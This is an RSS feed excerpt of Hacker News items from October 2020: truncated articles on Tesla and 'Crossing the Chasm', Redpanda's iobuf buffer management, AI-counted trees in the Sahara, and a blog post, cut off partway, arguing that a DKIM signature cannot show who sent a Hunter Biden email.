        <item>
            <title>
<![CDATA[Tesla and Crossing the Chasm]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24947398">thread link</a>) | @mgh2
<br/>
October 30, 2020 | https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html | <a href="https://web.archive.org/web/*/https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>For many years, technology companies have been faced with the challenge of launching new products. We are all familiar with the phrases "Innovators" and "early adopters" with respect to buyers. but how, as a technology and innovation company, do you transition through the different buyer groups to reach mainstream adoption?  What is well known is that the motivation for buying changes as the customer base matures, and as a consequence the value proposition, be that the service and/or product on offer, needs to reflect the changing needs of the buyer.</p><p>Tesla aren't dealing with one transition either, it could be argued they are dealing with three:
</p><p>
These points can be appealing to some, especially Innovators and early adopters who like change, but they can equally present a problem with more conservative mainstream buyers. 
</p><div>
<h2>What is crossing the chasm? </h2>
<p>Back in around 1991 Geoffery A. Moore wrote a book called <a href="https://amzn.to/2Tjo950" title="Crossing the Chasm">Crossing the chasm</a>. This work recognises that technology as it enters the market goes through different communities of buyers, each with a different set of values and needs, and the biggest stretch is the transition from the early adopter phase to the early majority, the phase where products essentially come of age and enter the mainstream. </p>
<p>Not only do the requirements and values the buying community want change, new technology goes through a cycle, what Gartner calls its Hype Cycle. This is the recognition that innovation and change is often driven by the development of new technology which after an increase in market excitement and hype goes through a period where its position in the market. The early use cases and examples are often missing the mark or are beset with the realities of implementation, scale, cost or consumer acceptance. This causes the product to enter the trough of disillusionment while these shortcomings are resolved for the technology to then regroup and grow but with a more main stream and successful acceptance in the market.   
</p><p>These elements are related in many respects although the fundamentals behind them are different. Both however are relevant to Tesla and to a large extent EV adoption in general.
</p><h3>Buyer types and where the chasm appears.</h3><p>
The different buying communities are represented in chart below:
</p><p>
<img src="https://tesla-info.com/blog/chasm.png" alt="Buyers and the chasm">
</p><p>
From the chart we can see there are various classes of buyer type, but there is a significant gap in the path, moving across the early adopter category.  Innovators are driven by the latest technology and pushing new boundaries, their motivation is to be at the forefront, they take pleasure from the journey as much as the product, breaking new ground. The early adopters are slightly different, while accepting new technology ahead of the rest of society, they understand the product may not be fully developed or that there may be shortcoming in support and longevity but expecting the product to be first of a kind, relatively unique in the market place, and offering something different. They do this because they are driven by change, and potentially happy to take a degree of risk. Many of the owners driven by the environmental benefits would fall into this category.</p>
<p>Tesla have played to these buyer types, the 'beta' software plays to the values that innovators and early adopters desire. The bugs that occur in the frequent updates reinforce the idea that the products are experimental and leading edge. It's possible that Tesla are deliberately creating this notion that 'every owner is a beta tester' to increase the affinity and bonding with the brand by these early buyers as if owners are not just consumers but are active contributors to the development process. This sense of contribution also propagates itself through the official owners groups that run surveys to find out the extent of problems on behalf of Tesla when the information is readily available to Tesla directly.</p>
<p>But as we move from the tail end of the Early adopters into the Early majority the decision-making process changes again.  Completeness of the product becomes more important, reliability is a factor coupled with robust support, the items are simply expected to work and in a cost effective manner. They still like to adopt change early but their attitude to buying risk is different, they care about the reputation of the company, the supporting services need to be in place, and they are starting to become price sensitive, and in the lack of unique differentiation, they want value. The product needs to do what it says on the tin. They‚Äôre looking for degrees of familiarity, they‚Äôre not looking at significant change, new products need to add to their lives without taking anything away. </p>
<p>This is an area where Tesla are increasingly struggling with. For those with an arms-length relationship with Tesla, they still see the hype, the 0-60 times and the enthusiastic innovators who promote the product, but rarely take a rounded and objective view of the ownership proposition.</p>
<p>This is relevant to both Tesla and EV adoption. It's a bold step change to move away from the known for many buyers. You simply cannot map the activities of Petrol ownership to that of EV ownership. To substitute the 5 mins filling a petrol car with charging doesn't work. But this change in attitude is still change, and people are notorious for pushing back against it and have done with other perfectly good EVs.</p>
<p>The conundrum that other auto makers are facing is that while many produce EVs, both BMW and Nissan have been making very credible EVs for many years, they have not reached the same levels of attraction as Tesla. Some Tesla buyers don't even recognise these companies as having an EV product, instance dismissing BMW as being "years behind" when they've been making pure EVs for 6 years and in some respects have significantly more advanced technology with their carbon core chassis and a more environmentally friendly construction with a high % of recycled materials. So the question that presents itself is whether it is EVs that people are buying when they buy a Tesla, or is it something else that Tesla have created, and will it last as it transitions through the buyer groups. And secondly, will the ownership proposition of an EV catch out those looking to buy Tesla as a brand? In other words, the adoption of EV has been relatively slow across all the other brands and only Tesla seem to have broken free with volume sales. While there are a number of factors to this, such as the supercharging network, the ability to supply higher volumes, the range and the performance, the step change Tesla has over the competitors suggests owners are buying "Tesla" and not "EV".</p>

<h3>Hype cycle</h3>
<p>Gartner have mapped many new technologies against what they call the Hype Cycle. This illustrates the various stages of evolution from initial ideas, through an early spike of excitement and into a trough of disillusionment where many of the early ideas fail to deliver for a given class of innovation only to regroup and reappear at some point in the future or potentially become a minor technology. The emergence of block chain is a classic example of a technology innovation that continues to struggle with finding any real world applications despite going through a peak of excitement a few years ago.</p>
<p>EVs are now accelerating to the top of the Hype Cycle with every marketing campaign for cars mentioning EV or self-charging in some fashion. The consumer reality for new buyers is yet to be appreciated. Running an EV requires a different approach to vehicle management and costs are not cheap. Even if public charging infrastructure was better, the use of the infrastructure still requires a change in behaviour and the risk of delays when unexpected events enter people's lives and a one hour rapid charge is difficult to accommodate. </p>
<p>Its highly likely that EV technology will evolve rapidly and we will look back on these days with affection but also wonder what why we thought an hour supercharging for 180 range was good, but what's not clear is whether the broader public will fall out of love with EVs once some of the ownership aspects start to emerge and EVs will not gain mass appeal unless financially significantly attractive through government incentives, or the practicalities of ownership are made significantly easier. The average car own will not want to have to sign up and have an account with 10 different charging networks.</p>
<p>Both crossing the chasm and the hype cycle are models and for any given product or technology class, the exact path, pace and success will be different, but we believe the principles are worth considering. They often mirror each other, but both illustrate the difficulty in momentum and the change of mindset from the early stages of the lifecycle to the needs of the later stages.

</p><h2>The Tesla journey across the chasm</h2><p> 
To see the journey that Tesla customers need to make, we're going to look at three areas:
</p><ul>
<li>The buying experience</li>
<li>The ownership experience</li>
<li>The support experience</li>
</ul>
<h3>The buying experience</h3>
<p>Innovators loved the different sales technique. The lack of sales staff who don't have an incentive to sell, just to educate, enable test drives and if you wanted to buy, they'd either let you do it from home, or sit you down at a screen in store and let you fill out the form. The innovators were all over the internet forums and many knew more about the cars that the sales centre staff. They knew the details of a dual motor car over a single version, the usable battery capacity, and so on, and the experience with Tesla was almost collaborative rather than retailer/customer. It was a bold decision to buy a Tesla in the early days and part of the experience for the innovators and early adopters was working out the detail when they recognised few others did. It became a hobby to find out everything there was to know. </p>
<p>These early buyers set up fan sites, dismantled cars, bought into the green credentials, searched planning applications for where new chargers might be ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html">https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html</a></em></p>]]>
            </description>
            <link>https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947398</guid>
            <pubDate>Fri, 30 Oct 2020 22:18:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amiga Boing Ball in WebGL]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24947254">thread link</a>) | @doener
<br/>
October 30, 2020 | http://clb.confined.space/amiga/ | <a href="https://web.archive.org/web/*/http://clb.confined.space/amiga/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://clb.confined.space/amiga/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947254</guid>
            <pubDate>Fri, 30 Oct 2020 21:56:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thread-per-Core Buffer Management for a Modern Kafka-API Storage System]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24947251">thread link</a>) | @fpina
<br/>
October 30, 2020 | https://vectorized.io/tpc-buffers/ | <a href="https://web.archive.org/web/*/https://vectorized.io/tpc-buffers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><div><div><main><section><p><a href="https://vectorized.io/redpanda-raison-detre">As I have previously observed</a>, software does not run on category theory, it runs on superscalar CPUs with wide, multi-channel GB/s memory units and NVMe SSD access times in the order of 10-100‚Äôs of microseconds. The reason some software written a decade ago - on a different hardware platform - feels slow is because it fails to exploit the advances in modern hardware.</p>
<p>The new bottleneck in storage systems is the CPU. SSD devices are 100-1000x faster than spinning disks and are 10x cheaper today[1] than they were a decade ago, from $2,500 down to $200 per Terabyte. Networks have 100x higher throughput in public clouds from 1Gbps to 100Gbps.</p>
<p>Although computers did, in fact, get faster, single-core speeds remain roughly the same. The reason being that CPU frequency has a cubic dependency on power consumption, and we‚Äôve hit a wall. Instruction level parallelism, prefetching, speculative execution, branch prediction, deep hierarchy of data caches and instruction caches, etc, have contributed to programs <em>feeling</em> faster when you interact with them, but in the datacenter, the material improvements have come from the rise in core count. While the instructions per clock are 3x higher than a decade ago, core count is up 20x.</p>
<p>This is all to say that the rise of readily available, many-core systems necessitates a different approach for building infrastructure. Case in point[9]: in order to take full advantage of 96 vCPUs on a i3en.metal on AWS, you‚Äôll need to find a way to exploit sustained CPU clock speed of 3.1 GHz, 60 TB of total NVMe instance storage, 768 GiB of memory and NVMe devices capable of delivering up to 2 million random IOPS at 4 KB block sizes. This kind of beast necessitates a new kind of storage engine and threading model that leverages these hardware advances.</p>
<p><a href="https://vectorized.io/tpc-buffers/vectorized.io/redpanda">Redpanda</a> - a Kafka-API compatible system for mission critical workloads[3] - addresses all of these issues. It uses a thread-per-core architecture with Structured Message Passing (SMP) to communicate between these pinned threads. Threading is a foundational decision for any application, whether you are using a thread-pool, pinned threads with a network of Single Producer Single Consumer SPSC[7] queues, or any other of the advanced Safe Memory Reclamation (SMR) techniques, threading is your ring-0, the true kernel of your application. It tells you what your sensitivity is for blocking - which for Redpanda is less than 500 microseconds - otherwise, Seastar‚Äôs[4] reactor will print a stack trace warning you of the blocking since it effectively injects latency on the network poller.</p>
<p>Once you have decided on your threading model, the next step is your memory model and ultimately, for storage engines, your buffer management. In this post, we‚Äôll cover the perils of buffer management in a thread-per-core environment and describe <code>iobuf</code>, our solution for a 0-copy memory management in the world of Seastar.</p>
<h2 id="Request-Flow-Architecture">Request Flow Architecture<a href="#Request-Flow-Architecture" aria-label="Request Flow Architecture permalink"></a></h2>
<p>As mentioned earlier, Redpanda uses a <em>single</em> pinned thread per core architecture to do everything. Network polling, submitting async IO to the kernel, reaping events, triggering timers, scheduling compute tasks, etc. Structurally, it means nothing can block for longer than 500 microseconds, or you‚Äôll be introducing latency in other parts of your stack. This is an incredibly strict programming paradigm, but this opinionated idea forces a truly asynchronous system, whether you like it or not as the programmer.</p>
<p><img src="https://vectorized.io/31d1a730c507b605e6c1ebea60eb1e56/flow.svg" alt="Kafka request flow">
<small>
Figure 1: request flow architecture. Core-0 accepts the connection from the Kafka Java client and becomes the source core. After the request goes through the metadata cache(valid request) it filters through the partition router which decides to send the request to core-1, the destination core. Core-1 then accepts the write through the Raft-log interface and saves it to disk.
</small></p>
<p>The challenge in a TpC (thread-per-core) architecture[8] is that all communication between cores is explicit. This muscles the programmer into implementing algorithms that favor core-locality (d-cache, i-cache) over the straightforward multi-threaded implementations via mutexes. This imperative has to be co-designed with the asynchronicity of a <strong>future&lt;&gt;</strong>-based implementation.</p>
<p>For our Kafka-API implementation as shown in Figure 1, we explicitly trade memory usage to reduce latency and increase throughput by materializing key components. The metadata Cache is materialized on every core since every request has to know if the partition exists, and that that particular machine is, in fact, the leader of the partition. The Partition Router maintains a map of which logical core actually owns the underlying Kafka partition on the machine. Other things like Access Control Lists (ACLs) are deferred until the request reaches the destination core since they can get unwieldy in memory footprint.  We have no hard and fast rule of what we materialize on every core vs. what is deferred for the destination core, and it‚Äôs often a function of memory (smaller data structures are good candidates for broadcast), computation (how much time is spent deciding) and frequency of access (very likely operations tend to get materialized on every core).</p>
<p>One question remaining is how, exactly, does memory management work in a TpC architecture? How does data actually travel from L-core-0 to L-core-66 safely using a network of SPSC queues within a fully asynchronous execution model where things can suspend at any point in time?</p>
<h2 id="struct-iobuf--">struct iobuf { };<a href="#struct-iobuf--" aria-label="struct iobuf   permalink"></a></h2>
<h3 id="Redpandas-0-copy-buffer-management-for-TpC">Redpanda‚Äôs 0-copy buffer management for TpC<a href="#Redpandas-0-copy-buffer-management-for-TpC" aria-label="Redpandas 0 copy buffer management for TpC permalink"></a></h3>
<p>To understand <strong>iobuf</strong>, we need to understand the actual memory constraints of Seastar, our TpC framework. During program bootstrap, Seastar allocates the full memory of the computer and splits it evenly across all the cores. It consults the hardware to understand what memory belongs to each particular core, reducing inter-core traffic to main memory.</p>
<p><img src="https://vectorized.io/efa273909c5b695bf7f978f77b32c12b/seastar_model.svg" alt="Seastar mental model">
<small>
Figure 2: Copy from alexgallego.org (<a href="https://www.alexgallego.org/concurrency/smf/2017/12/16/future.html" target="_self" rel="nofollow">https://www.alexgallego.org/concurrency/smf/2017/12/16/future.html</a>) Seastar threading model. Seastar uses a network of SPS queues to send messages to neighboring cores. Similar to other message passing or actor models like Erlang, Orleans and Pony, once a function is futurized, transitive functions too will become futurized. Both approaches, however, are intrinsically safe. The programmer worries about correctness and construction while the frameworks worry about efficient execution. Counter to general wisdom, it is actually faster and more scalable than the synchronous approach. While the machine does more work, it is executing your code simultaneously. This simultaneity is the key to finishing work sooner.
</small></p>
<p>As Figure 2 suggests, memory allocated on core-0, <em>must</em> be deallocated on core-0. However, there is no way to guarantee that a Java or Go client connecting to Redpanda will actually communicate with the exact core that owns the data.</p>
<p>At its core, an iobuf is a ref-counted, fragmented-buffer-chain with deferred deletes that allows Redpanda to simply share a view of a remote core‚Äôs parsed messages as the fragments come in, without incurring a copy overhead.</p>
<p><img src="https://vectorized.io/6df6fc00e05201d068dc5d03e080606a/iobuf.svg" alt="iobuf architecture"></p>
<p>The fragmented buffers abstraction is not new. The linux kernel has <strong>sk_buff</strong>[5] and the freebsd kernel has an <strong>mbuf</strong>[6] which are roughly similar. The additional extension of an iobuf is that it works in the TCP model leveraging Seastar‚Äôs network of SPSC queues to have proper deletes in addition to being able to share sub-views arbitrarily, tailored for a storage-like workload.</p>
<p>Removing the C++ templates, allocators, pooling, pointer caching, etc, one could think of an iobuf as being equivalent to:</p>
<div data-language="cpp"><pre><code><span>struct</span> <span>fragment</span> <span>{</span>
    <span>void</span> <span>*</span> data<span>;</span>
    size_t ref_count<span>;</span>
    size_t capacity<span>;</span>
    size_t size<span>;</span>

    fragment<span>*</span> next<span>;</span>  
    fragment<span>*</span> prev<span>;</span>
<span>}</span>
<span>struct</span> <span>iobuf</span> <span>{</span>
    fragment<span>*</span> head<span>;</span>
<span>}</span><span>;</span></code></pre></div>
<p>The origins of iobuf are rooted in one of our central product tenets for building a Kafka¬Æ replacement for mission critical systems - giving users 10x lower tail latencies for most workloads. Aside from a thread-per-core architecture, the memory management would have been our second bottleneck if not designed from the ground up for latency. On long running storage systems, memory fragmentation is a real problem, and one that is eventually either met with a proper solution (iobuf), stalls or an OOM.</p>
<p>Like its predecessors skbuff and mbuff, iobuf allows us to optimize and train our memory allocator with predictable memory sizes. Here is our iobuf allocation table logic:</p>
<div data-language="cpp"><pre><code><span>struct</span> <span>io_allocation_size</span> <span>{</span>
   <span>static</span> <span>constexpr</span> size_t max_chunk_size <span>=</span> <span>128</span> <span>*</span> <span>1024</span><span>;</span>
   <span>static</span> <span>constexpr</span> size_t default_chunk_size <span>=</span> <span>512</span><span>;</span>

   
   
   
   
   
   
   <span>static</span> <span>constexpr</span> std<span>::</span>array<span>&lt;</span><span>uint32_t</span><span>,</span> <span>15</span><span>&gt;</span> alloc_table <span>=</span>
     
     <span>{</span><span>{</span><span>512</span><span>,</span>
       <span>768</span><span>,</span>
       <span>1152</span><span>,</span>
       <span>1728</span><span>,</span>
       <span>2592</span><span>,</span>
       <span>3888</span><span>,</span>
       <span>5832</span><span>,</span>
       <span>8748</span><span>,</span>
       <span>13122</span><span>,</span>
       <span>19683</span><span>,</span>
       <span>29525</span><span>,</span>
       <span>44288</span><span>,</span>
       <span>66432</span><span>,</span>
       <span>99648</span><span>,</span>
       <span>131072</span><span>}</span><span>}</span><span>;</span>

   <span>static</span> size_t <span>next_allocation_size</span><span>(</span>size_t data_size<span>)</span><span>;</span>
<span>}</span><span>;</span>   </code></pre></div>
<p>Predictability, memory pooling, fixed sizes, size capping, fragmented traversal, etc, are all known techniques to reduce latency. Asking for contiguous and variably sized memory could cause the allocator to compact all of the arenas and reshuffle a lot of bytes for what could be a short-lived request, not only injecting latency on the request path, but for the entire system since we have exactly one thread performing all operations.</p>
<p>Hardware is the platform. When we ask the network layer to give us exactly 11225 bytes in contiguous memory, we are simply asking the allocator to linearize an empty buffer of that exact size and for the network layer to copy bytes as the fragments come from the hardware into the destination buffer. There is ultimately no free lunch when it comes to trying to squeeze every single ounce of performance of your hardware and often it requires re-architecting from zero.</p>
<p>If you made it this far, I encourage you to sign up for our <a href="https://vectorized.io/slack" target="_self" rel="nofollow">Community Slack (here!)</a> and ask us questions directly or engage with us on twitter via <a href="https://twitter.com/vectorizedio" target="_self" rel="nofollow">@vectorize‚Ä¶</a></p></section></main></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vectorized.io/tpc-buffers/">https://vectorized.io/tpc-buffers/</a></em></p>]]>
            </description>
            <link>https://vectorized.io/tpc-buffers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947251</guid>
            <pubDate>Fri, 30 Oct 2020 21:56:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Artificial intelligence reveals hundreds of millions of trees in the Sahara]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24947022">thread link</a>) | @rbanffy
<br/>
October 30, 2020 | https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/ | <a href="https://web.archive.org/web/*/https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-area">
        <div>
          <!-- Content with right menu -->

<div>
  
    





  

	<p>
		20 October 2020
	</p>

	


	<div>
		<p><span>TREES</span></p><p>There are far more trees in the West African Sahara and Sahel than most would expect. A combination of artificial intelligence and detailed satellite imagery allowed a team from the University of Copenhagen and international collaborators to count all trees across a 1.3 million km2 area of West Africa. 
</p>
	</div> 
		<figure>
			<img alt="Dryland landscape in Africa" src="https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/billedinformationer/Sahara_1100x600.jpg" title="Dryland landscape in Africa">
			<figcaption>Photo: Martin Brandt</figcaption>
		</figure>

	<p>If you think that the Sahara is covered only by golden dunes and scorched rocks, you aren‚Äôt alone. Perhaps it's time to shelve that notion. In an area of West Africa 30 times larger than Denmark, an international team, led by University of Copenhagen and NASA researchers, has counted over 1.8 billion trees and shrubs. The 1.3 million km<sup>2</sup> area covers the western-most portion of the Sahara Desert, the Sahel and what are known as sub-humid zones of West Africa.</p>
<p>"We were very surprised to see that quite a few trees actually grow in the Sahara Desert, because up until now, most people thought that virtually none existed. We counted hundreds of millions of trees in the desert alone. Doing so wouldn't have been possible without this technology. Indeed, I think it marks the beginning of a new scientific era," asserts Assistant Professor Martin Brandt of the University of Copenhagen‚Äôs Department of Geosciences and Natural Resource Management, lead author of <a href="https://www.nature.com/articles/s41586-020-2824-5">the study‚Äôs scientific article, now published in <em>Nature</em></a>.</p>
<p>The work was achieved through a combination of detailed satellite imagery provided by NASA, and deep learning ‚Äî an advanced artificial intelligence method. Normal satellite imagery is unable to identify individual trees, they remain literally invisible. Moreover, &nbsp;a limited interest in counting trees outside of forested areas led to the prevailing view that there were almost no trees in this particular region. This is the first time that trees across a large dryland region have been counted.</p>
<h2>The role of trees in the global carbon budget</h2>
<p>New knowledge about trees in dryland areas like this is important for several reasons, according to Martin Brandt. For example, they represent an unknown factor when it comes to the global carbon budget:</p>
<p>"Trees outside of forested areas are usually not included in climate models, and we know very little about their carbon stocks. They are basically a white spot on maps and an unknown component in the global carbon cycle," explains Martin Brandt.</p>
<p>Furthermore, the new study can contribute to better understanding the importance of trees for biodiversity and ecosystems and for the people living in these areas. In particular, enhanced knowledge about trees is also important for developing programmes that promote agroforestry, which plays a major environmental and socio-economic role in arid regions.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>"Thus, we are also interested in using satellites to determine tree species, as tree types are significant in relation to their value to local populations who use wood resources as part of their livelihoods. Trees and their fruit are consumed by both livestock and humans, and when preserved in the fields, trees have a positive effect on crop yields because they improve the balance of water and nutrients," explains Professor Rasmus Fensholt of the Department of Geosciences and Natural Resource Management.</p>

<figure><img alt="The area where the trees were mapped" src="https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/billedinformationer/West_Africa_study_area_1100x600.jpg" title="The red rectangle marks the area where the trees were mapped">
<figcaption>The red rectangle marks the area where the trees were mapped.</figcaption>
</figure>

<h2>Technology with a high potential</h2>
<p>The research was conducted in collaboration with the University of Copenhagen‚Äôs Department of Computer Science, where researchers developed the deep learning algorithm that made the counting of trees over such a large area possible.</p>
<p>The researchers show the deep learning model what a tree looks like: They do so by feeding it thousands of images of various trees. Based upon the recognition of tree shapes, the model can then automatically identify and map trees over large areas and thousands of images. The model needs only hours what would take thousands of humans several years to achieve.</p>
<p>"This technology has enormous potential when it comes to documenting changes on a global scale and ultimately, in contributing towards global climate goals. It is a motivation for us to develop this type of beneficial artificial intelligence," says professor and co-author Christian Igel of the Department of Computer Science.</p>
<p>The next step is to expand the count to a much larger area in Africa. And in the longer term, the aim is to create a global database of all trees growing outside forest areas.</p>





  

</div>
<div>

  
    
    
        	

	


        <div>
    <p>
        <h2>Fakta</h2>
    </p>
    <div>
        <ul>
<li>The researchers counted 1.8 billion trees and shrubs with crowns larger than 3 m<sup>2</sup>. Thus, the actual number of trees in the area is even higher.</li>
<li>Deep learning can be characterized as an advanced artificial intelligence method where an algorithm is trained to recognize specific patterns in large amounts of data. The algorithm used in this research was trained using nearly 90,000 images of different trees across a variety of landscapes. </li>
<li><a href="https://www.nature.com/articles/s41586-020-2824-5">The scientific article for this study is published in the renowned journal Nature.</a> </li>
<li>The research was carried out by researchers from the University of Copenhagen; NASA Goddard Space Flight Center, USA; HCI Group, University of Bremen, Germany; Universit√© Paul Sabatier, France; Pastoralisme Conseil, France; Centre de Suivi Ecologique, Senegal; Geosciences Environnement Toulouse (GET), France; Ecole Normale Sup√©rieure, France; Universit√© Catholique de Louvain, Belgium.</li>
<li>The research is supported, among others, The AXA Research Fund (postdoctoral programme); Independent Research Fund Denmark - Sapere Aude; Villum Foundation and the European Research Council (ERC) under the EU's Horizon 2020 Programme.</li>
</ul>

    </div>
</div>






  
</div>

        </div>
      </div></div>]]>
            </description>
            <link>https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947022</guid>
            <pubDate>Fri, 30 Oct 2020 21:22:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Draw Your Own Conclusions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946813">thread link</a>) | @jaxxstorm
<br/>
October 30, 2020 | https://leebriggs.co.uk/blog/2020/10/29/draw-your-own-conclusions.html | <a href="https://web.archive.org/web/*/https://leebriggs.co.uk/blog/2020/10/29/draw-your-own-conclusions.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
<p>The year is 2020, and the US election is a matter of days away. While the world deals with an unprecedented pandemic and Americans on both sides of the aisle fight for what they believe to be the very soul of their nation, conservative media is in a frenzy about a laptop that contains emails from <a href="https://en.wikipedia.org/wiki/Hunter_Biden">Hunter Biden</a>, which has been procured by <a href="https://en.wikipedia.org/wiki/Rudy_Giuliani">Rudy Giuliani</a>, who was named President Donald Trump‚Äôs <a href="https://www.washingtonpost.com/news/powerpost/wp/2017/01/12/trump-names-rudy-giuliani-as-cybersecurity-adviser/">cybersecurity expert</a> in 2017.</p>
<p>Now, anyone who has previously read this blog will wonder why on earth I‚Äôm writing about this topic. To be quite honest, it‚Äôs past 10pm on a Thursday evening and I‚Äôm sort of wondering why myself. However, I saw a set of tweets in my timeline which raised my eyebrows. Here‚Äôs the first tweet in the thread:</p>
<blockquote><p lang="en" dir="ltr">So as I blogged before, the emails contained DKIM information, which the original reporters could and should have verified. So I eventually got a copy of the email and run DKIM verification on it. It passed: <a href="https://t.co/HVjOlMq7QV">https://t.co/HVjOlMq7QV</a></p>‚Äî Rob·µâ ≥·µó Grahamüò∑, provocateur (@ErrataRob) <a href="https://twitter.com/ErrataRob/status/1322007153415200768?ref_src=twsrc%5Etfw">October 30, 2020</a></blockquote>

<p>To provide some context, the Daily Caller (a news organization founded by <a href="https://en.wikipedia.org/wiki/Tucker_Carlson">Tucker Carlson</a> among others) have printed a story on their website in which they cite evidence from Rob Graham, a well respected Information Security researcher (who is has written powerful and widely used tools). Rob has gone out of his way to retrieve a copy of an email from the Hunter Biden ‚Äúlaptop from hell‚Äù and verified the <a href="https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail">DKIM signature</a> of one of the most damning emails.</p>
<p>To quote the Daily Caller, this information <em>authenticates</em> these emails. Here is the exact quote (<a href="https://web.archive.org/web/20201030052504/https://dailycaller.com/2020/10/29/cybersecurity-expert-authenticates-hunter-biden-burisma-email/">at the time of writing</a>) from the Daily Caller article:</p>
<p><em>Graham, who has been cited as a cybersecurity expert in The Washington Post, the Associated Press, Wired, Engadget and other news and technology outlets, told the DCNF that he used a cryptographic signature found in the email‚Äôs metadata to validate that Vadym Pozharsky, an advisor to Burisma‚Äôs board of directors, emailed Hunter Biden on April 17, 2015.</em></p>
<p>Before I examine this particular claim, I‚Äôd like to assert that I am not an internet security researcher that has been cited in the Washington Post like Rob. I do, however, have a fairly good understanding of how email, DKIM, the internet and computers in general work.</p>
<p>I can say with a very high degree of certainty that the quote from the article is spurious at best, and utter horseshit at worst. It is impossible to verify that Vadym Pozharsky sent that email from a DKIM signature alone.</p>
<h2 id="lets-talk-about-email">Let‚Äôs talk about email</h2>
<p>Anyone with even a passing interest in IT and computers may have heard that email is insecure by design. At its very core, email was designed to send communications between people in plaintext, and every attempt to secure it since its conception has been a bolted on attempt to try and fix it, with varying degrees of success.</p>
<p>There‚Äôs a reason you get so much spam in your inbox, and it‚Äôs the same reason you get told by people at your employer not to click on links in emails you don‚Äôt trust. To provide a non-exhaustive list:</p>
<ul>
<li>It‚Äôs very easy to forge the <code>from:</code> field of an email address</li>
<li>It‚Äôs possible to intercept an email and read its content without a whole lot of legwork</li>
<li>Email providers are notoriously lax with who they allow to create accounts</li>
</ul>
<p>DKIM was created in 2011 to try and attempt to stop some of the issues around the above issues, with varying degrees of success.</p>
<h2 id="what-the-fuck-is-dkim">What the fuck is DKIM?</h2>
<p>DKIM is an email enhancement which is designed to prevent the forging of sender addresses in email. It works by using <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">Public-key cryptography</a> to ‚Äúsign‚Äù emails when they are sent.</p>
<p>When you send an email with DKIM enabled, it‚Äôs signed by a private key which is held by your outbound mail server (although, not exclusively, but that‚Äôs beyond the scope of this article). When this happens, your email server embeds an <a href="https://en.wikipedia.org/wiki/Email#Header_fields">email header</a> into the outgoing email, with key information such as who the sender is, and the location of the public key used in the keypair which signed the email. This information can be used to verify the email‚Äôs origin.</p>
<p>Many of the large email providers enable DKIM by default on outbound mail, because it works wonders in preventing spam originating from their domains. It‚Äôs for this reason that spammers will often try and hijack the credentials for your email accounts and use them as part of their spam bots - getting access to a valid account on a respected email provider with DKIM enabled will almost always bypass any spam protection the recpient has enabled.</p>
<p>Knowing this information, we can make some very strong assertions from the email (which is available <a href="https://github.com/robertdavidgraham/hunter-dkim/blob/main/Meeting%20for%20coffee.eml">here</a> with the DKIM header included).</p>
<h3 id="what-we-can-verify">What we can verify</h3>
<p>Rob did the heavy lifting for us. The email contains a DKIM signature and Rob verified that the signature was valid:</p>
<blockquote><p lang="en" dir="ltr">So you search the Internet for "TXT 20120113._domainkey.gmail.com" and you'll find lots of answers what the key was 6 years ago:<a href="https://t.co/eK6kHNd9Mn">https://t.co/eK6kHNd9Mn</a></p>‚Äî Rob·µâ ≥·µó Grahamüò∑, provocateur (@ErrataRob) <a href="https://twitter.com/ErrataRob/status/1322009696149164032?ref_src=twsrc%5Etfw">October 30, 2020</a></blockquote>

<p>We can say with a very high degree of certainty that the email linked above originated from a <em>genuine google email address</em>. The address the email came from is <code><a href="https://leebriggs.co.uk/cdn-cgi/l/email-protection" data-cfemail="96e0b8e6f9ecfef7e4e5fdefffb8e3fde4f7fff8f3d6f1fbf7fffab8f5f9fb">[email&nbsp;protected]</a></code> and if we consider the definition of <em>authentic</em> that we can verify the emails‚Äô origin, we could arguably say that this email is <em>authentic</em>.</p>
<p>However, if we recall the original article from the Daily Caller, they didn‚Äôt just claim the email is authentic, they actually said this:</p>
<p><em>‚Ä¶told the DCNF that he used a cryptographic signature found in the email‚Äôs metadata to validate that Vadym Pozharsky, an advisor to Burisma‚Äôs board of directors, emailed Hunter Biden on April 17, 2015.</em></p>
